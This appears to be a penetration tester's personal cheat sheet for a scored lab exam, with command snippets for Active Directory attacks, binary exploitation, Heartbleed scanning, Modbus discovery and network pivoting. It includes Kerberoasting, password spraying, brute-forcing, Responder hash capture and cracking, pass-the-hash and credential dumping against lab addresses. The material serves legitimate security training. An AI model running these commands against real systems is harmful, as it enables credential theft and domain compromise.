1. #### **Active Directory Range (500 marks): AD enumeration, Kerberos attacks, and domain compromise (Tools: Nmap, Hydra, CrackMapExec, Plink, BloodHound, Responder).**

IPs- 172.25.170.30,   172.25.170.200,  172.25.170.90





**Enumerate first-** 

enum4linux-ng -A <ip>

smbclient

rpcclient

smbmap 



**Sweep credentials across the domain with NetExec**

nxc smb <cidr> -u user -p pass --shares







**Map the attack path with BloodHound Community Edition fed by the SharpHound collector**

SharpHound.exe -c All





**Roast the domain-**

impacket-GetUserSPNs corp.local/user:pass -request

hashcat -m 13100     **\[for Kerberoasting]**

impacket-GetNPUsers

hashcat -m 18200    **\[for AS-REP]**

kerbrute userenum -d example.com -u userlist.txt  **\[ User Enumeration]**

kerbrute userenum -d example.com --dc 192.168.1.100 -u userlist.txt  **\[With a specific Domain Controller IP]**

kerbrute passwordspray -d example.com -p "Password123" userlist.txt   **\[Password Spraying]**



kerbrute passwordspray -d example.com --dc 192.168.1.100 -p "Password123" userlist.txt  **\[With a specific Domain Controller IP]**



kerbrute passwordspray --safe -d example.com -p "Password123" userlist.txt  **\[With the safe flag (stops execution immediately if an account lockout is triggered)]**







kerbrute bruteuser -d example.com passwords.txt target\_username   **\[Brute-forcing a single user (testing multiple passwords against one account)]**



kerbrute bruteforce -d example.com creds.txt   **\[Bulk Brute-force (testing username:password combinations)]**



./kerbrute\_linux\_amd64 userenum --dc 192.168.1.19 -d ignite.local users.txt

./kerbrute\_linux\_amd64 passwordspray --dc 192.168.1.19 -d ignite.local users.txt Password@1

./kerbrute\_linux\_amd64 bruteuser --dc 192.168.1.19 -d ignite.local pass.txt aarti

cat userpass.txt | ./kerbrute\_linux\_amd64 --dc 192.168.1.19 -d ignite.local bruteforce -

&#x20;./kerbrute\_linux\_amd64 userenum --dc 192.168.1.19 -d ignite.local users.txt -o result.txt

./kerbrute\_linux\_amd64 userenum --dc 192.168.1.19 -d ignite.local users.txt -v





**Move and dump**

impacket-secretsdump

wmiexec

psexec

atexec

Responder 

evil-winrm -i <ip> -u admin -H <ntlm>  











ssh username@10.129.86.14

ip a **\[<BROADCAST,MULTICAST,UP,LOWER\_UP> inet 172.16.7.240/23 brd 172.16.7.255]**

sudo responder -I ens224

ls /usr/share/responder/logs

cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt



hashid 'AB\*\*\*::INLANEFREIGHT:0c6498a2a4acd121:FC356D6AD000000000200080036004A004500310001001E00570049004E002D00500049004D<...SNIP...>'   **\[John or Hashcat]**



echo 'AB\*\*\*::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:0200080036004A004500310001001E00570049004E002D00500049004D<...SNIP...>' > AB\*\*\*



john --format=netNTLMv2 -w=/usr/share/wordlists/rockyou.txt AB920

























#### **2. Binaries \& IoT Range (500 marks): Binary reverse engineering, debugging, and IoT/firmware analysis (Tools: GDB, Binwalk, PwnKit, Pwntools, write custom payloads.).**



file pwn101.pwn101

checksec pwn101.pwn101



nc -nv 10.10.x.x 9001  

**\[Use nc to connect to port 9001 and send your crafted input of 'AAAAAAAAAAA'. Ensure you include a newline character at the end of your input to flush the buffer. Once connected, paste your payload and observe the output for any clues or the flag.]**







msf-pattern\_create / msf-pattern\_offset

msfvenom -b '\\x00\\x0a\\x0d'

pwntools 







**IoT and firmware**

strings firmware.bin | grep -iE 'pass|key|token'

binwalk -e

unsquashfs







**Live IoT**

mosquitto\_sub -h <ip> -t '#' -v





















#### **3. Capture the Flag (CTF) Range (500 marks): Multi-technique and multi-layer CTF challenge flags (Tools: ShellShock exploitation and custom scripts).**









nmap -p 443,80 --script ssl-heartbleed <ip>

msfconsole

use auxiliary/scanner/ssl/openssl\_heartbleed

set RHOSTS <target\_ip>

set RPORT 443

set VERBOSE true

exploit

































#### **4**. **Operational Technology (OT) Range (500 marks): ICS/SCADA protocols and industrial network analysis (Tools: Modbus, tcpdump, Wireshark).**

ICS and web, ICS/Modbus, 



nmap -p 502 --script modbus-discover



























#### **5. Pivoting \& Double Pivoting Range (500 marks): Single and double pivoting, tunneling through internal segmented networks (Tools: Chisel, Proxychains, Impacket, CrackMapExec).**



proxychains **\[SSH forwarding cold- -L local, -R remote, -D dynamic SOCKS.]**





ligolo-ng



**Inside Metasploit**

autoroute 

socks\_proxy









